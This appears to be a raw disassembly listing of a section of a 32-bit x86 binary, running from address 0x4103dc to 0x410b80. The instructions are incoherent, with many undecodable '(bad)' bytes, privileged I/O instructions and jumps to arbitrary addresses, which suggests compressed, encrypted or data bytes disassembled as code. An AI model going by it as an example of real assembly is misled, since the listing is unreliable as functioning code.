  4103dc:	mov    ss,WORD PTR [edi]
  4103de:	push   esp
  4103df:	mov    dl,0xd7
  4103e1:	mov    ecx,0xf52b9f9e
  4103e6:	hlt    
  4103e7:	pop    edx
  4103e8:	clc    
  4103e9:	dec    ebp
  4103ea:	dec    ecx
  4103eb:	xor    eax,0xd6faa6f6
  4103f0:	ficomp WORD PTR [edx-0x65c2a1c4]
  4103f6:	dec    ebx
  4103f7:	sahf   
  4103f8:	stos   BYTE PTR es:[edi],al
  4103f9:	inc    ebp
  4103fa:	outs   dx,DWORD PTR ds:[esi]
  4103fb:	fwait
  4103fc:	sub    eax,0x2d1da776
  410401:	out    0xa4,al
  410403:	pop    ss
  410404:	in     eax,0x81
  410406:	out    0xe3,al
  410408:	js     0x410408
  41040a:	sbb    eax,0x1d6c9214
  41040f:	jo     0x41039c
  410411:	jge    0x410459
  410413:	pushf  
  410414:	(bad)  
  410415:	jle    0x4103dc
  410417:	ficom  DWORD PTR [ebx+ebp*1]
  41041a:	pop    ebp
  41041b:	push   edx
  41041c:	jb     0x410492
  41041e:	sti    
  41041f:	mov    WORD PTR [edi],cs
  410421:	xor    DWORD PTR [ebx],edi
  410423:	popa   
  410424:	xlat   BYTE PTR ds:[ebx]
  410425:	inc    edx
  410426:	sub    al,cl
  410428:	mov    ch,0x40
  41042a:	and    BYTE PTR [esi-0x7e],dh
  41042d:	sub    ebx,DWORD PTR [eax]
  41042f:	and    DWORD PTR ds:0x5634b54d,esp
  410435:	std    
  410436:	pop    ebx
  410437:	into   
  410438:	adc    edi,DWORD PTR [ebp+0x2a]
  41043b:	dec    ebp
  41043c:	sbb    ebp,DWORD PTR [ecx+eiz*8-0x1a9c1218]
  410443:	nop
  410444:	(bad)  
  410445:	sbb    BYTE PTR [edx-0x5a70f31a],al
  41044b:	pop    ecx
  41044c:	mov    ah,0xd2
  41044e:	dec    esi
  41044f:	jnp    0x4104ad
  410451:	fldcw  WORD PTR [ebx-0x55b1e719]
  410457:	dec    ebp
  410458:	mov    ebx,DWORD PTR [ecx-0x32162364]
  41045e:	mov    dl,cl
  410460:	(bad)  
  410461:	jae    0x41040e
  410463:	js     0x4104d0
  410465:	call   0xd86d7259
  41046a:	and    eax,0xeb6e11f2
  41046f:	stos   BYTE PTR es:[edi],al
  410470:	arpl   cx,di
  410472:	ins    DWORD PTR es:[edi],dx
  410473:	sbb    DWORD PTR ds:0xd0292afa,edi
  410479:	int3   
  41047a:	xor    al,dl
  41047c:	punpckldq mm5,mm0
  41047f:	(bad)  
  410480:	jmp    0x410428
  410482:	daa    
  410483:	outs   dx,BYTE PTR ds:[esi]
  410484:	or     DWORD PTR [edi],edi
  410486:	cld    
  410487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410488:	xchg   esi,eax
  410489:	ds pop ecx
  41048b:	stos   BYTE PTR es:[edi],al
  41048c:	sub    eax,0x686a44b0
  410491:	push   ebx
  410492:	push   esi
  410493:	sub    ebp,ecx
  410495:	fs (bad) 
  410497:	push   ds
  410498:	xor    bl,BYTE PTR [eax+0x18]
  41049b:	into   
  41049c:	stos   BYTE PTR es:[edi],al
  41049d:	sbb    ch,ch
  41049f:	inc    edx
  4104a0:	aas    
  4104a1:	mov    ecx,0x25dcab11
  4104a6:	sar    al,1
  4104a8:	rcl    DWORD PTR [edi+edx*8+0x37],0xce
  4104ad:	sub    al,0x58
  4104af:	add    eax,0x25c216a7
  4104b4:	pop    ebx
  4104b5:	repz push cs
  4104b7:	call   0xda55207
  4104bc:	stos   BYTE PTR es:[edi],al
  4104bd:	addr16 test al,0xb2
  4104c0:	dec    edi
  4104c1:	mov    bl,0x75
  4104c3:	add    BYTE PTR [ebx],bl
  4104c5:	fld    TBYTE PTR [edx-0x46]
  4104c8:	leave  
  4104c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104ca:	add    BYTE PTR [ecx+0x54d36e3f],0xb2
  4104d1:	xchg   edi,eax
  4104d2:	fld    QWORD PTR [ebx]
  4104d4:	cdq    
  4104d5:	sbb    ebp,DWORD PTR [esi]
  4104d7:	in     eax,dx
  4104d8:	loope  0x410481
  4104da:	sub    BYTE PTR [esi],bl
  4104dc:	ins    BYTE PTR es:[edi],dx
  4104dd:	fidiv  DWORD PTR [ebp-0x2]
  4104e0:	pushf  
  4104e1:	je     0x41050b
  4104e3:	push   ss
  4104e4:	pop    es
  4104e5:	sbb    BYTE PTR [ebx],0x51
  4104e8:	push   0x52
  4104ea:	jmp    0x4345da4f
  4104ef:	or     eax,0x6009f384
  4104f4:	xor    al,0xaa
  4104f6:	fwait
  4104f7:	(bad)  
  4104f8:	stc    
  4104f9:	cmp    DWORD PTR [edx],esp
  4104fb:	loope  0x41049b
  4104fd:	pop    ebp
  4104fe:	test   BYTE PTR es:[ebp-0x4b964b7c],cl
  410505:	dec    esi
  410506:	cmp    DWORD PTR [ebp+edx*4+0x748cadff],0xffffffbe
  41050e:	mov    ebx,0x30cc5584
  410513:	stos   BYTE PTR es:[edi],al
  410514:	fs sub eax,0xf781526a
  41051a:	dec    edx
  41051b:	test   al,0xb
  41051d:	cld    
  41051e:	sub    ch,BYTE PTR [esi+0x16]
  410521:	out    dx,eax
  410522:	and    eax,0xec0804af
  410527:	in     al,dx
  410528:	mov    ecx,0x31f11b79
  41052d:	call   0x6a9d0945
  410532:	cwde   
  410533:	xchg   edi,eax
  410534:	imul   BYTE PTR ds:0xe868bb56
  41053a:	fsub   st(3),st
  41053c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41053d:	fistp  DWORD PTR [eax+esi*1+0x77]
  410541:	loopne 0x41053c
  410543:	cwde   
  410544:	jle    0x4105c1
  410546:	jmp    0x4104e5
  410548:	xchg   ebp,eax
  410549:	(bad)  
  41054a:	sub    al,BYTE PTR [eax]
  41054c:	and    esi,DWORD PTR [esi+0x79]
  41054f:	pop    edx
  410550:	xchg   edx,eax
  410551:	or     al,0x18
  410553:	push   ebx
  410554:	stc    
  410555:	shl    esi,cl
  410557:	cmp    BYTE PTR [edx],dh
  410559:	adc    DWORD PTR [edx+0x1c],esp
  41055c:	cmp    esi,DWORD PTR [edi+0x2bec7e82]
  410562:	hlt    
  410563:	push   edi
  410564:	hlt    
  410565:	test   al,0xc7
  410567:	out    0x6c,eax
  410569:	push   esi
  41056a:	into   
  41056b:	mov    ah,0x44
  41056d:	test   DWORD PTR ds:0x690e5094,0x5303473f
  410577:	adc    bl,0xc
  41057a:	fxsave [edx]
  41057d:	outs   dx,DWORD PTR ds:[esi]
  41057e:	movsx  eax,bl
  410581:	lods   eax,DWORD PTR ds:[esi]
  410582:	gs cmp cl,0x36
  410586:	(bad)  
  410587:	aas    
  410588:	pop    es
  410589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41058a:	dec    ebx
  41058b:	je     0x41059c
  41058d:	sar    DWORD PTR [edi],0xd4
  410590:	jp     0x4105dd
  410592:	lods   al,BYTE PTR ds:[esi]
  410593:	fistp  WORD PTR [ebp+0x2bd841a2]
  410599:	cwde   
  41059a:	fwait
  41059b:	sbb    BYTE PTR [ecx+ebp*8],bl
  41059e:	pop    ebp
  41059f:	icebp  
  4105a0:	cmp    cl,BYTE PTR [eax+ebx*4-0x7b]
  4105a4:	int    0x84
  4105a6:	mov    ch,BYTE PTR [edx]
  4105a8:	mov    ebp,0x98cda255
  4105ad:	(bad)  
  4105ae:	pop    esp
  4105af:	mov    al,0xd3
  4105b1:	dec    ecx
  4105b2:	mov    esp,DWORD PTR [eax-0x5b]
  4105b5:	outs   dx,BYTE PTR ds:[esi]
  4105b6:	ror    dh,0x26
  4105b9:	sub    DWORD PTR ds:0x8c8979a9,eax
  4105bf:	dec    edx
  4105c0:	mov    ds:0x77a42c2c,al
  4105c5:	mov    al,ds:0x6a989808
  4105ca:	test   BYTE PTR [eax],bh
  4105cc:	stos   BYTE PTR es:[edi],al
  4105cd:	pop    esp
  4105ce:	pusha  
  4105cf:	cmp    bh,al
  4105d1:	loop   0x4105d4
  4105d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105d4:	sbb    al,0x81
  4105d6:	push   es
  4105d7:	jg     0x410559
  4105d9:	xor    BYTE PTR [esp+ecx*8-0x70],dh
  4105dd:	fcomip st,st(2)
  4105df:	sbb    al,0x9b
  4105e1:	jno    0x410645
  4105e3:	sbb    DWORD PTR [edx],edi
  4105e5:	and    eax,0x58def3d1
  4105ea:	xchg   DWORD PTR [edx+0x38ce9307],ebx
  4105f0:	nop
  4105f1:	aaa    
  4105f2:	or     BYTE PTR [edx],0x76
  4105f5:	std    
  4105f6:	int3   
  4105f7:	scas   al,BYTE PTR es:[edi]
  4105f8:	and    dh,BYTE PTR [edx]
  4105fa:	icebp  
  4105fb:	stos   DWORD PTR es:[edi],eax
  4105fc:	add    cl,dl
  4105fe:	mov    WORD PTR [esi+0x7a724f8a],ss
  410604:	cmp    eax,0x58882aed
  410609:	ins    BYTE PTR es:[edi],dx
  41060a:	add    eax,0x1535a3dd
  41060f:	std    
  410610:	add    eax,0x4f0fb4c6
  410615:	cli    
  410616:	icebp  
  410617:	clc    
  410618:	stc    
  410619:	sub    BYTE PTR [edi],0x87
  41061c:	bound  esp,QWORD PTR [ebx+0x2eaad4ba]
  410622:	enter  0x6681,0x86
  410626:	fistp  DWORD PTR [edx-0x44]
  410629:	inc    ecx
  41062a:	add    al,0x3a
  41062c:	add    DWORD PTR [esi+0xb],ebx
  41062f:	push   edx
  410630:	clc    
  410631:	les    ecx,FWORD PTR [edx-0x2691b5e0]
  410637:	imul   eax,ebx,0x5f
  41063a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41063c:	cmp    bh,BYTE PTR [edx]
  41063e:	dec    edx
  41063f:	mov    ds:0xd912ae10,eax
  410644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410645:	iret   
  410646:	cli    
  410647:	inc    esi
  410648:	or     BYTE PTR [ecx],ch
  41064a:	(bad)  
  41064b:	fsubr  QWORD PTR [ebx-0x621b3571]
  410651:	daa    
  410652:	and    BYTE PTR [edi+edx*4],dl
  410655:	sbb    al,0xb6
  410657:	sub    esp,DWORD PTR [eax+0xf3e3c59]
  41065d:	addr16 sbb esi,edx
  410660:	mov    ebp,0x9d8b39e8
  410665:	sub    BYTE PTR [ebx-0x761428c4],cl
  41066b:	xchg   ecx,edi
  41066d:	mov    DWORD PTR [esi-0x3d98579b],esi
  410673:	adc    al,0x77
  410675:	mov    ebx,0xe3023053
  41067a:	and    eax,0x60b01947
  41067f:	or     BYTE PTR [ebx+0x5f],0x54
  410683:	push   ecx
  410684:	mov    ds:0xf61eea8f,al
  410689:	jno    0x410629
  41068b:	outs   dx,DWORD PTR ds:[esi]
  41068c:	mov    bl,0xf2
  41068e:	or     al,0x15
  410690:	jb     0x4106be
  410692:	cld    
  410693:	ret    0x6df0
  410696:	and    cl,al
  410698:	imul   ecx,DWORD PTR [ebx+0x7d],0x13a2d6fe
  41069f:	mov    bh,0x22
  4106a1:	loope  0x410668
  4106a3:	loopne 0x41068b
  4106a5:	mov    al,ds:0xe584555f
  4106aa:	jae    0x41063d
  4106ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106ad:	cmp    eax,0xbee08ef4
  4106b2:	je     0x41070a
  4106b4:	jmp    0x72f1:0x8c71425a
  4106bb:	adc    DWORD PTR [edx-0x84463df],0x4c
  4106c2:	pop    ebx
  4106c3:	jg     0x410704
  4106c5:	adc    BYTE PTR [edi-0x28a50862],bl
  4106cb:	imul   ebp,DWORD PTR [edi+0x1a],0x28
  4106cf:	adc    edi,edi
  4106d1:	inc    ecx
  4106d2:	add    bh,BYTE PTR [esi+0x29ae613]
  4106d8:	mov    cl,0xde
  4106da:	sahf   
  4106db:	mov    dl,0x8e
  4106dd:	jl     0x410744
  4106df:	mov    edx,DWORD PTR [ebx+0x72]
  4106e2:	scas   al,BYTE PTR es:[edi]
  4106e3:	loopne 0x41071e
  4106e5:	data16 (bad) 
  4106e7:	(bad)  
  4106e8:	call   0x124726ee
  4106ed:	das    
  4106ee:	jb     0x410737
  4106f0:	xor    al,BYTE PTR [esi-0x3d]
  4106f3:	pop    ds
  4106f4:	mov    esp,0x35cfcbad
  4106f9:	retf   
  4106fa:	push   es
  4106fb:	dec    edx
  4106fc:	mov    eax,ds:0x38a8af4
  410701:	repnz push ds
  410703:	xchg   esi,eax
  410704:	push   es
  410705:	shl    DWORD PTR [ebx+0x5a97a485],1
  41070b:	mov    eax,ds:0x19f3fd4d
  410710:	jnp    0x410699
  410712:	jle    0x41078f
  410714:	inc    ebx
  410715:	call   0x88fd:0xcc6f3769
  41071c:	mov    dl,0xaa
  41071e:	mov    dh,0x25
  410720:	mov    eax,ds:0x352d62ea
  410725:	mov    bl,0xb6
  410727:	jae    0x410774
  410729:	test   al,0x4
  41072b:	daa    
  41072c:	sbb    esp,edx
  41072e:	mov    ecx,DWORD PTR fs:[ebx+0x35]
  410732:	xchg   esi,eax
  410733:	push   esp
  410734:	outs   dx,BYTE PTR ds:[esi]
  410735:	pop    edi
  410736:	and    eax,0xc148c33
  41073b:	in     eax,dx
  41073c:	bound  ebx,QWORD PTR [esi-0x70f8dd0c]
  410742:	(bad)  
  410743:	mov    esi,0x876fe99
  410748:	pop    edi
  410749:	cmp    al,0xee
  41074b:	pushf  
  41074c:	sbb    BYTE PTR [edx-0x51],al
  41074f:	mov    al,ds:0x9da8c66f
  410754:	cmp    BYTE PTR [ebx],cl
  410756:	push   ebp
  410757:	xchg   edx,eax
  410758:	outs   dx,DWORD PTR ds:[esi]
  410759:	and    eax,0xdea9e330
  41075e:	ins    BYTE PTR es:[edi],dx
  41075f:	xor    eax,0xc48058ac
  410764:	cld    
  410765:	repnz add DWORD PTR [edi+0x1d],esp
  410769:	pop    eax
  41076a:	test   BYTE PTR [ebp+0x39],bh
  41076d:	and    ch,bh
  41076f:	(bad)  
  410770:	push   esi
  410771:	jge    0x410707
  410773:	leave  
  410774:	mov    al,ds:0x693841d6
  410779:	mov    edi,0x64f8ab43
  41077e:	jne    0x4107ca
  410780:	aaa    
  410781:	mov    ecx,0x9d866fc5
  410786:	push   es
  410787:	pop    ebx
  410788:	fldz   
  41078a:	jp     0x4107a3
  41078c:	cmc    
  41078d:	push   esp
  41078e:	dec    ebx
  41078f:	sbb    ah,bh
  410791:	inc    ebx
  410792:	lods   al,BYTE PTR ds:[esi]
  410793:	pop    ebx
  410794:	imul   esi,DWORD PTR [esp+esi*8+0x4e],0x67
  410799:	jb     0x41074a
  41079b:	and    al,0xd9
  41079d:	pop    ds
  41079e:	xor    bl,BYTE PTR [edx]
  4107a0:	sub    esi,DWORD PTR [esi]
  4107a2:	push   ebp
  4107a3:	loope  0x4107a0
  4107a5:	xor    BYTE PTR [edi],dh
  4107a7:	inc    edi
  4107a8:	add    BYTE PTR [ebx-0x6207125a],bh
  4107ae:	mov    cl,dh
  4107b0:	stos   BYTE PTR es:[edi],al
  4107b1:	cdq    
  4107b2:	inc    edx
  4107b3:	sbb    BYTE PTR [esi],bh
  4107b5:	iret   
  4107b6:	or     edx,DWORD PTR [esi]
  4107b8:	jbe    0x410836
  4107ba:	and    eax,0x1a2ad6b9
  4107bf:	cli    
  4107c0:	mov    gs,WORD PTR [edx]
  4107c2:	push   ecx
  4107c3:	pushf  
  4107c4:	scas   eax,DWORD PTR es:[edi]
  4107c5:	rcl    DWORD PTR [esi*8-0x6d4107ed],1
  4107cc:	test   al,0x7c
  4107ce:	inc    BYTE PTR [ebx]
  4107d0:	repz mov ebp,0x79e517d6
  4107d6:	test   DWORD PTR [esi-0x23],edx
  4107d9:	pusha  
  4107da:	pop    edx
  4107db:	jno    0x410797
  4107dd:	sbb    dl,al
  4107df:	jmp    0xd5cbdd3
  4107e4:	sbb    BYTE PTR [edx],cl
  4107e6:	xor    eax,0xa7444411
  4107eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107ec:	jbe    0x410808
  4107ee:	sbb    esp,edx
  4107f0:	mov    eax,0x45dfecab
  4107f5:	dec    esp
  4107f6:	jns    0x410817
  4107f8:	js     0x4107c3
  4107fa:	mov    edi,0xc123e99a
  4107ff:	and    bh,BYTE PTR [edi+0x38]
  410802:	mov    edi,0x1cec790
  410807:	jge    0x41085f
  410809:	pop    esp
  41080a:	rcr    edx,0xef
  41080d:	ins    DWORD PTR es:[edi],dx
  41080e:	jl     0x41083d
  410810:	dec    esi
  410811:	pop    ebp
  410812:	out    0xeb,al
  410814:	push   edi
  410815:	imul   ebx,DWORD PTR [ebp+0x6f],0x89585f97
  41081c:	mov    tr6,ecx
  41081f:	cwde   
  410820:	jns    0x4107b2
  410822:	adc    edi,ecx
  410824:	push   ss
  410825:	jne    0x4107ca
  410827:	lods   al,BYTE PTR ds:[esi]
  410828:	xchg   ebx,eax
  410829:	popa   
  41082a:	xor    esi,esi
  41082c:	and    edx,DWORD PTR [esi+0x70]
  41082f:	push   edx
  410830:	add    al,0xed
  410832:	xchg   edi,eax
  410833:	fisubr DWORD PTR [ebx]
  410835:	jp     0x410820
  410837:	imul   ebx,DWORD PTR [edx+ebp*4+0x2a],0x28ed15cd
  41083f:	sub    esi,DWORD PTR [esi+ebx*2+0xa]
  410843:	(bad)
  410846:	adc    dh,BYTE PTR [edx+0x59cac99]
  41084c:	loop   0x41082b
  41084e:	out    0xb9,al
  410850:	or     ecx,ebx
  410852:	fsubrp st(6),st
  410854:	mov    ds:0x89854b3f,al
  410859:	jp     0x4108b7
  41085b:	cmp    eax,DWORD PTR [esi-0x4c]
  41085e:	adc    esi,DWORD PTR [edx+0x6d]
  410861:	and    al,BYTE PTR [ebx+0x15]
  410864:	js     0x4108ba
  410866:	fbstp  TBYTE PTR [edi]
  410868:	push   ecx
  410869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41086a:	jnp    0x4108ea
  41086c:	adc    al,0x49
  41086e:	cmp    bh,0x1c
  410871:	xchg   edi,eax
  410872:	in     al,dx
  410873:	sahf   
  410874:	add    al,0x74
  410876:	xchg   BYTE PTR [ebp+ebx*1+0x68],cl
  41087a:	jbe    0x41083e
  41087c:	pop    esp
  41087d:	mov    dl,0x94
  41087f:	lea    ebp,[ebp-0x2894cbd3]
  410885:	retf   
  410886:	ret    0xab03
  410889:	jle    0x4108b6
  41088b:	or     DWORD PTR [edi-0xe5c6d18],esi
  410891:	mov    edi,0xbf049e7f
  410896:	fldcw  WORD PTR gs:[esi-0x5b6c5faa]
  41089d:	jnp    0x410879
  41089f:	iret   
  4108a0:	mov    ds:0x4868c7c2,eax
  4108a5:	add    DWORD PTR [ecx+ecx*1+0xead4f87],ecx
  4108ac:	push   ebp
  4108ad:	inc    edx
  4108ae:	ins    BYTE PTR es:[edi],dx
  4108af:	sub    DWORD PTR [esi+edx*2],ebp
  4108b2:	fimul  DWORD PTR [ebp-0x6bbf4854]
  4108b8:	sub    al,0xda
  4108ba:	jmp    0x4108fe
  4108bc:	xchg   ebp,eax
  4108bd:	mov    bh,0xa
  4108bf:	inc    ebp
  4108c0:	rcr    DWORD PTR [ebp+0x76],0x52
  4108c4:	arpl   WORD PTR [edi],sp
  4108c6:	(bad)  
  4108c7:	mov    edi,0x2aadf221
  4108cc:	popa   
  4108cd:	sub    eax,0x254fb73c
  4108d2:	or     ebx,edi
  4108d4:	ficom  DWORD PTR ds:0xb6482c4c
  4108da:	call   0xe3758286
  4108df:	outs   dx,BYTE PTR ds:[esi]
  4108e0:	mov    esp,DWORD PTR [esi+0x2fbfb0cc]
  4108e6:	pop    edi
  4108e7:	cs dec ecx
  4108e9:	add    DWORD PTR [ebp+0x1],ebp
  4108ec:	lahf   
  4108ed:	sbb    DWORD PTR [esi-0x7439d7d],esi
  4108f3:	sahf   
  4108f4:	shl    DWORD PTR [edx+0x6f],cl
  4108f7:	or     al,0x51
  4108f9:	xor    BYTE PTR [edx+0x23],bh
  4108fc:	xor    eax,0xf1e689d2
  410901:	shr    DWORD PTR [esp+edx*1-0x10],cl
  410905:	xchg   ebx,eax
  410906:	push   edx
  410907:	mov    eax,ds:0x2b953b3e
  41090c:	nop
  41090d:	(bad)
  410913:	mov    eax,ds:0x9dfc00ce
  410918:	(bad)  
  410919:	lods   eax,DWORD PTR ds:[esi]
  41091a:	hlt    
  41091b:	dec    ebx
  41091c:	push   edx
  41091d:	retf   
  41091e:	jge    0x41098b
  410920:	arpl   WORD PTR [edi-0x11],dx
  410923:	call   0x52ef:0x7137be3d
  41092a:	mov    ecx,0x44be5a16
  41092f:	add    esi,esi
  410931:	(bad)
  410934:	and    dl,BYTE PTR [esi]
  410936:	imul   esi,DWORD PTR [eax-0x23],0xbaaab441
  41093d:	stc    
  41093e:	scas   eax,DWORD PTR es:[edi]
  41093f:	ror    cl,0xa7
  410942:	pushf  
  410943:	push   edi
  410944:	inc    ecx
  410945:	mov    eax,ds:0x54405edf
  41094a:	in     eax,0xa5
  41094c:	inc    edx
  41094d:	pop    edx
  41094e:	adc    eax,0x5965e815
  410953:	dec    ebx
  410954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410955:	sbb    eax,0xdd4a4996
  41095a:	fistp  WORD PTR [esi-0x5]
  41095d:	xchg   BYTE PTR [esi+0x13214201],ah
  410963:	out    dx,al
  410964:	sbb    eax,0x8a2952ce
  410969:	(bad)  
  41096a:	mov    esi,0xff6261c9
  41096f:	jle    0x41097b
  410971:	aas    
  410972:	retf   0x7fe8
  410975:	cmc    
  410976:	jg     0x410914
  410978:	int3   
  410979:	mov    ebx,0x6dbbccde
  41097e:	mov    ch,0x5f
  410980:	es ins BYTE PTR es:[edi],dx
  410982:	mov    ecx,ebx
  410984:	add    DWORD PTR [edx-0x57b3d303],0x28
  41098b:	mov    ?,esp
  41098d:	imul   edi,ecx,0x3f6bf9da
  410993:	inc    eax
  410994:	addr16 aas 
  410996:	push   0xbf0f7f4a
  41099b:	stos   BYTE PTR es:[edi],al
  41099c:	imul   ecx,DWORD PTR [edi-0x18],0x4e
  4109a0:	cmp    DWORD PTR [edi+0x38],esp
  4109a3:	pop    ebp
  4109a4:	cdq    
  4109a5:	mov    dh,0x1f
  4109a7:	mov    dl,0xca
  4109a9:	pop    ss
  4109aa:	cmp    cl,BYTE PTR [ebx]
  4109ac:	jae    0x410a08
  4109ae:	ins    BYTE PTR es:[edi],dx
  4109af:	sub    DWORD PTR [ecx],esp
  4109b1:	jmp    0x41099f
  4109b3:	stc    
  4109b4:	je     0x410a19
  4109b6:	jns    0x410958
  4109b8:	lea    esp,[esi-0x6bddf678]
  4109be:	push   0xffffffd6
  4109c0:	aaa    
  4109c1:	jg     0x410988
  4109c3:	adc    eax,0x4a46ab66
  4109c8:	popf   
  4109c9:	adc    al,0x56
  4109cb:	mov    ds:0x245d16f3,eax
  4109d0:	mov    BYTE PTR [edi+edi*4-0x24e9129f],ch
  4109d7:	or     ah,BYTE PTR [edx-0x73]
  4109da:	jl     0x4109e8
  4109dc:	out    0x76,al
  4109de:	or     DWORD PTR ss:[edx+0x37ed56c3],ebp
  4109e5:	fwait
  4109e6:	das    
  4109e7:	(bad)  
  4109e8:	fisttp DWORD PTR [ebp+0x2b371708]
  4109ee:	test   BYTE PTR [edi-0x44721c0],dl
  4109f4:	xchg   edx,eax
  4109f5:	mov    ecx,0xfa31d04d
  4109fa:	pop    ds
  4109fb:	mov    esp,0x669e075
  410a00:	dec    ebp
  410a01:	lods   eax,DWORD PTR ds:[esi]
  410a02:	out    dx,eax
  410a03:	xor    esp,ebx
  410a05:	xor    BYTE PTR [ebx+0x3b0561e7],ch
  410a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a0c:	push   edi
  410a0d:	push   cs
  410a0e:	(bad)  
  410a0f:	adc    eax,0x98876e9a
  410a14:	push   ebp
  410a15:	lock adc eax,0x684dd95a
  410a1b:	pop    ds
  410a1c:	xchg   ecx,eax
  410a1d:	inc    edi
  410a1e:	in     al,dx
  410a1f:	rol    BYTE PTR [eax+edx*8],1
  410a22:	or     bh,BYTE PTR [ebx-0x31]
  410a25:	ds mov al,0xef
  410a28:	xor    DWORD PTR [edi],ecx
  410a2a:	xor    DWORD PTR [ebp-0x3],esi
  410a2d:	push   esi
  410a2e:	cmp    eax,0x8db48f10
  410a33:	lahf   
  410a34:	fdivr  QWORD PTR [ebp-0x27]
  410a37:	stos   DWORD PTR es:[edi],eax
  410a38:	(bad)  
  410a39:	mov    esi,0xffcbbefc
  410a3e:	mov    ah,0xec
  410a40:	(bad)  
  410a41:	lods   al,BYTE PTR ds:[esi]
  410a42:	mov    ds:0xebc304df,al
  410a47:	pop    ebp
  410a48:	inc    eax
  410a49:	jp     0x410a55
  410a4b:	imul   ecx,DWORD PTR [esi+0x40],0xe4184fe8
  410a52:	loope  0x410a4a
  410a54:	mov    ebx,gs
  410a56:	sub    ecx,eax
  410a58:	xchg   esp,eax
  410a59:	fsubr  QWORD PTR [eax]
  410a5b:	aam    0x53
  410a5d:	pop    eax
  410a5e:	xor    al,BYTE PTR [edx+0x53]
  410a61:	and    dh,BYTE PTR [esi+0x203e1900]
  410a67:	push   esp
  410a68:	inc    ebp
  410a69:	dec    ebp
  410a6a:	cmc    
  410a6b:	adc    al,0xec
  410a6d:	faddp  st(7),st
  410a6f:	ret    0xe415
  410a72:	mov    ecx,0xa8dc9518
  410a77:	cli    
  410a78:	jle    0x410ac2
  410a7a:	inc    eax
  410a7b:	out    0x9c,eax
  410a7d:	lahf   
  410a7e:	in     eax,dx
  410a7f:	(bad)  
  410a80:	shl    DWORD PTR [esi-0x535b7675],1
  410a86:	retf   
  410a87:	xor    ch,dl
  410a89:	xor    ah,dh
  410a8b:	rcr    BYTE PTR [esi],0x58
  410a8e:	mov    ds:0xf8b996b1,al
  410a93:	push   0xffffffe8
  410a95:	sbb    eax,0x9d64fab2
  410a9a:	bound  esp,QWORD PTR [edi]
  410a9c:	sbb    eax,0x53d0d1d6
  410aa2:	lods   eax,DWORD PTR ds:[esi]
  410aa3:	xor    eax,0xd824d6ef
  410aa8:	or     eax,0xe039f21
  410aad:	jp     0x410aed
  410aaf:	int3   
  410ab0:	xor    eax,0x6c5d3029
  410ab5:	fld    QWORD PTR [esi+0x352abc12]
  410abb:	jge    0x410b39
  410abd:	jecxz  0x410a61
  410abf:	test   eax,0xe4ff70e7
  410ac4:	xchg   ebx,eax
  410ac5:	nop
  410ac6:	in     al,dx
  410ac7:	popf   
  410ac8:	sbb    esp,DWORD PTR [ebp+0x41]
  410acb:	mov    ?,WORD PTR [esi-0x7f]
  410ace:	loopne 0x410ae2
  410ad0:	cdq    
  410ad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ad2:	mov    edi,0x97dbd92f
  410ad7:	data16 std 
  410ad9:	push   ss
  410ada:	push   esp
  410adb:	mov    al,0x59
  410add:	ins    BYTE PTR es:[edi],dx
  410ade:	inc    ebx
  410adf:	adc    DWORD PTR ds:0x42f37c8f,ebx
  410ae5:	ror    edx,cl
  410ae7:	call   0x6f1ebbc4
  410aec:	push   esi
  410aed:	push   ebx
  410aee:	jp     0x410b5f
  410af0:	aad    0x48
  410af2:	inc    ebx
  410af3:	mov    eax,ds:0xac3410e7
  410af8:	cmp    BYTE PTR [edi+0x5912a401],dh
  410afe:	adc    al,0x3c
  410b00:	pop    edi
  410b01:	jecxz  0x410b22
  410b03:	(bad)  
  410b04:	scas   eax,DWORD PTR es:[edi]
  410b05:	xchg   edx,eax
  410b06:	lods   al,BYTE PTR ds:[esi]
  410b07:	jge    0x410aa7
  410b09:	jne    0x410b2c
  410b0b:	adc    al,0xf5
  410b0d:	xchg   BYTE PTR [edx-0x3],al
  410b10:	mov    eax,ds:0x16babcac
  410b15:	cmp    esp,DWORD PTR [esi+eiz*8]
  410b18:	push   edi
  410b19:	sahf   
  410b1a:	sub    ah,ah
  410b1c:	mov    DWORD PTR [edx-0x52],edi
  410b1f:	or     ebx,ebp
  410b21:	inc    esi
  410b22:	bound  ecx,QWORD PTR [ebx-0x33]
  410b25:	mov    eax,ds:0x23c82b17
  410b2a:	inc    ecx
  410b2b:	adc    BYTE PTR [ebx+0x55],bh
  410b2e:	and    bl,bh
  410b30:	jno    0x410b1b
  410b32:	in     al,dx
  410b33:	push   eax
  410b34:	xchg   ebx,eax
  410b35:	sub    BYTE PTR [ebp+0x3d],dh
  410b38:	sub    al,0x22
  410b3b:	(bad)  
  410b3c:	clc    
  410b3d:	fwait
  410b3e:	jbe    0x410af7
  410b40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b41:	sbb    al,0x7f
  410b43:	jmp    0x2b24d087
  410b48:	dec    edi
  410b49:	daa    
  410b4a:	fxch   st(4)
  410b4c:	pop    esi
  410b4d:	psrlw  mm6,mm4
  410b50:	je     0x410b02
  410b52:	jg     0x410bcc
  410b54:	add    al,0x28
  410b56:	jo     0x410b5c
  410b58:	in     eax,dx
  410b59:	or     BYTE PTR [edx-0x78],ah
  410b5c:	or     BYTE PTR [esp+esi*8+0x56],bh
  410b60:	push   esp
  410b61:	es cmp edi,edx
  410b64:	aad    0x4
  410b66:	test   esp,esi
  410b68:	aad    0xd3
  410b6a:	mov    ?,eax
  410b6c:	cdq    
  410b6d:	lods   al,BYTE PTR ds:[esi]
  410b6e:	dec    ebp
  410b6f:	cmp    ecx,DWORD PTR [edi+0x69]
  410b72:	mov    BYTE PTR [eax],ah
  410b74:	inc    eax
  410b75:	adc    DWORD PTR [ebx+0x12],0x64
  410b79:	add    DWORD PTR [edi-0x56c9d4c8],0xffffffb5
  410b80:	adc    BYTE PTR ds:0xcfefccab,dh
